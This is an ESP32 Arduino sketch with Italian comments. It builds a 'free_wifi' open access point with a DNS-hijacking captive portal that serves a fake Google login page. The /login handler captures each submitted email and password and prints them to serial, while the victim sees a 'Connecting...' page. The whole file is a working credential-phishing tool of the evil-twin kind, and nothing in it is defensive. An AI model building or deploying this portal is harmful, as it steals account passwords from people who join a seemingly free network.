/*

ACTIVE MODE 

*/

#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"

// DEVO USARE L'SD PER SALVARMI LE COSE IN MEMORIA

// access point generato dall'esp
char *ssid_esp ="free_wifi";
char *psw_esp = "";

char *psw_bluetooth ="1234";

DNSServer dnsServer;
AsyncWebServer httpServer(80);

const char index_html[] PROGMEM= R"rawliteral(
  <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
    
    <body>
      <h1>Login</h1>
      <p></p>
      <form action="/login">
        Your email Google : <input type="email" name="email"></input><br>
        Password : <input type="password" name="password"></input>
        <input type="submit"></input>
      </form>
    </body>
  </html>
)rawliteral";

const char login_html[] PROGMEM=R"rawliteral(
      <html>
      <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
      <body>Connecting...<br> 
        <a href="/">Turn back</a></body>
      </html>
      )rawliteral";

class CaptiveRequestHandler : public AsyncWebHandler{
  public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}
    
    bool canHandle(AsyncWebServerRequest *request){
      return true; // gestisce tutte le richieste
    }
    void handleRequest(AsyncWebServerRequest *request){
      // questo fa in modo che il server rimandi immediatamente alla pagina iniziale
      request->send_P(200,"text/html",index_html);
    }
};


void setupServerPages(){
  // si setta il comportamento per ogni singola pagina
  httpServer.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send_P(200,"text/html",index_html);
  });

  httpServer.on("/login",HTTP_GET,[](AsyncWebServerRequest *r){
    String inputEmail="";
    String inputPassword="";

    if (r->hasParam("email")){
      inputEmail=r->getParam("email")->value();
    }
    if (r->hasParam("password")){
      inputPassword=r->getParam("password")->value();
}

    Serial.println("USER DATA: "+ inputEmail+ " "+ inputPassword);

    r->send(200,"text/html",login_html);
  });


  httpServer.onNotFound([](AsyncWebServerRequest *r){
    r->redirect("/");
  });
}


void setupESPLocalNetwork(char* ssid,char* psw,IPAddress accesspoint,IPAddress gateway,IPAddress subnet){
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(accesspoint,gateway,subnet);
  while (!WiFi.softAP(ssid,psw)){
    delay(750);
    Serial.println("...");
  }
  dnsServer.start(53, "*", WiFi.softAPIP());
  httpServer.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  setupServerPages();
  httpServer.begin();
  Serial.println("ESP router IP "+WiFi.softAPIP().toString());
}